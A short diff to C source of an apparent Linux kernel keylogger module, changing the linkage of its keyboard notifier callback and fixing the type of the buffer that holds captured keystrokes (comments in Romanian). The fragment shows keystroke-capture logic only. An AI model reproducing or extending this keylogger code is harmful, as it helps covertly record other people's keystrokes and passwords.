@@ -2,7 +2,7 @@
 #include "struct_keylogger.h"
 #include "keycode_to_string.h"
 #include "flush.h"
-static int keyboard_callback(struct notifier_block* nb,unsigned long action, void *data)
+ int keyboard_callback(struct notifier_block* nb,unsigned long action, void *data)
 {
     struct keyboard_notifier_param* kparam;
     struct KEYLOGGER* klogger;
@@ -10,7 +10,7 @@ static int keyboard_callback(struct notifier_block* nb,unsigned long action, voi
     klogger=container_of(nb,KEYLOGGER,key_notifier);
     if(kparam->down==0)
         return NOTIFY_OK;
-    char* tmp[TMP_BUFF_SIZE];//bufferul in care voi avea tasta apasata
+    char tmp[TMP_BUFF_SIZE];//bufferul in care voi avea tasta apasata
     size_t keystrlen=0;//lungimea tastei
     if((keystrlen=keycode_to_string(kparam->value,kparam->shift,tmp,TMP_BUFF_SIZE))==0)
         return NOTIFY_OK;
